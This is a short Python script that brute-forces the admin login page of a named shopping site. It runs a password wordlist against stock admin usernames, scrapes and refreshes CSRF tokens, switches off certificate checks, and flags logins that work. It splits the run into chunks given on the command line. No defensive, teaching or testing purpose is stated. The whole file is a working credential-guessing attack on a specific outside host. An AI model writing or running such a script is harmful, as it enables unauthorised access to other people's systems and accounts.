import httpx, re, sys
URL='https://ofa77.shop/module/admin/unionshop/user/login'
UA={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121 Safari/537.36'}
pwds=[l.strip() for l in open('ofa77_pwds_big.txt') if l.strip()]
lo=int(sys.argv[1]); hi=int(sys.argv[2])
users=['admin','administrator','root','manager','superadmin','ofa77']
c=httpx.Client(verify=False, timeout=20, headers=UA)
tok=None
def get_tok():
    global tok
    r=c.get(URL); m=re.search(r'name="_token" value="([^"]+)"', r.text)
    tok=m.group(1) if m else ''
    return tok
def success(html,st):
    if st==302: return True
    return ('dashboard' in html or 'logout' in html) and '密碼錯誤' not in html and '帳號不存在' not in html
found=[]; n=0
for p in pwds[lo:hi]:
    for u in users:
        if tok is None or n%80==0: get_tok()
        try:
            r=c.post(URL, data={'_token':tok,'username':u,'password':p}, follow_redirects=True)
            n+=1
            if success(r.text, r.status_code):
                found.append((u,p,r.status_code))
                print('HIT', u, p, r.status_code)
            if r.status_code==419: get_tok()
        except Exception as e:
            pass
print(f'CHUNK {lo}-{hi} done posts={n} found={found}')
